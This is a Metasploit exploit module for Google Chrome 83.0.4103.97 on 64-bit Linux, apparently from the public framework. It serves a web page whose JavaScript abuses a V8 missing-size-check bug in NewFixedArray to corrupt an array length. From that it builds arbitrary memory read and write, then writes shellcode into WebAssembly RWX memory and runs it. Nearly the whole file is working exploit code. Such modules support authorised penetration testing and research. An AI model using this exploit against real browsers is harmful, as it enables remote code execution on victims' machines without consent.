##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Google Chrome 83 Missing size check in NewFixedArray',
      'Description'    => %q{
      This module exploits an issue in Google Chrome 83.0.4103.97 (64 bit). The exploit
      makes use of a missing size check in NewFixedArray and abuses it to create a
      JSArray with an invalid length. This is abused to gain arbitrary read/write into
      the isolate region. Then an ArrayBuffer can be used to achieve absolute arbitrary
      read/write.
      The exploit then uses WebAssembly in order to allocate a region of RWX memory,
      which is then replaced with the payload shellcode.
      The payload is executed within the sandboxed renderer process, so the browser
      must be run with the --no-sandbox option for the payload to work correctly.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
          'Sergei Glazunov', # discovery
          'Rajvardhan Agarwal (r4j)', # exploit
        ],
      'References'     => [
          ['URL', 'https://github.com/v8/v8/commit/85bc1b0cab31cc064efc65e05adb81fee814261b#diff-2e2c5645d87dabecd3793b1f10300974'],
          ['URL', 'https://github.com/r4j0x00/exploits/tree/master/chrome-exploit'],
        ],
      'Arch'           => [ ARCH_X64 ],
      'DefaultTarget'  => 0,
      'Targets'        =>
        [
          ['Linux - Google Chrome 83.0.4103.97 (64 bit)', {'Platform' => 'linux'}],
        ],
      'DisclosureDate' => 'Aug 25 2020'))
  end

  def on_request_uri(cli, request)
    print_status("Sending #{request.uri} to #{request['User-Agent']}")
    js_payload = Rex::Text.to_num(payload.raw).gsub(/\n/, '')
    jscript = %Q^
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

var arraybuf = new ArrayBuffer(0x13373);
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
var mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(mod);
var shell = wasm_instance.exports.shell;
var obj_array = [1337331,1337332,1337333,1337334,wasm_instance,wasm_instance,1337336,1337337];

var shellcode = new Uint8Array([#{js_payload}]);

function ftoi(val) {
         f64_buf[0] = val;
         return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
         u64_buf[0] = Number(val & 0xffffffffn);
         u64_buf[1] = Number(val >> 32n);
         return f64_buf[0];
}

array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double =
    new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0);

  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1];

  corrupting_array[x] = length_as_double;
  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}
corrupted_array = trigger(giant_array)[1];

var search_space = [[(0x8040000-8)/8, 0x805b000/8], [(0x805b000)/8, (0x83c1000/8)-1], [0x8400000/8, (0x8701000/8)-1], [0x8740000/8, (0x8ac1000/8)-1], [0x8b00000/8, (0x9101000/8)-1]];
function searchmem(value)
{
	skip = 0;
	for(i=0; i<search_space.length; ++i)
	{
		for(j=search_space[i][0];j<search_space[i][1];++j)
		{
			if(((ftoi(corrupted_array[j])) >> 32n) === value || (((ftoi(corrupted_array[j])) & 0xffffffffn) === value))
			{
				if(skip++ == 2) // Probably the first two are due to the search itself
					return j;
			}
		}
	}
	return -1;
}

function searchmem_full(value)
{
	for(i=0;i<search_space.length;++i)
	{
		for(j=search_space[i][0];j<search_space[i][1];++j)
		{
			if((ftoi(corrupted_array[j]) === value))
			{
				if((((ftoi(corrupted_array[j+2]) >> 56n) & 0xffn) == 8n) && (((ftoi(corrupted_array[j+2]) >> 24n) & 0xffn) == 8n))
				{
					return j;
				}
			}
		}
	}
	return -1;
}

var arraybuf_idx = searchmem(0x13373n);
if(arraybuf_idx == -1)
{
	throw new Error("Not found");
}
function arb_read(addr, length)
{
	var data = [];
	let u8_arraybuf = new Uint8Array(arraybuf);
	corrupted_array[arraybuf_idx+1] = itof(addr);
	for(i=0;i<data.length;++i)
		data.push(u8_arraybuf[i]);
	return data;
}

function arb_write(addr, data)
{
	corrupted_array[arraybuf_idx+1] = itof(addr);
	let u8_arraybuf = new Uint8Array(arraybuf);
	for(i=0;i<data.length;++i)
		u8_arraybuf[i] = data[i];
}

idx = searchmem_full((1337332n << 33n) + (1337331n << 1n));
if (idx == -1)
{
	alert('Failed 2');
	throw new Error("Not found");
}

wasm_addr = ftoi(corrupted_array[idx+2]) & 0xffffffffn;
rwx_idx = Number((wasm_addr-1n+0x68n)/8n);
rwx_addr = ftoi(corrupted_array[rwx_idx-1]);
if ((wasm_addr & 0xfn) == 5n || (wasm_addr & 0xfn) == 0xdn)
{
	rwx_addr >>= 32n;
	rwx_addr += (ftoi(corrupted_array[rwx_idx]) & 0xffffffffn) << 32n;
}
arb_write(rwx_addr, shellcode);
shell();
^

    html = %Q^
<html>
<head>
<script>
#{jscript}
</script>
</head>
<body>
</body>
</html>
    ^
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
  end

end
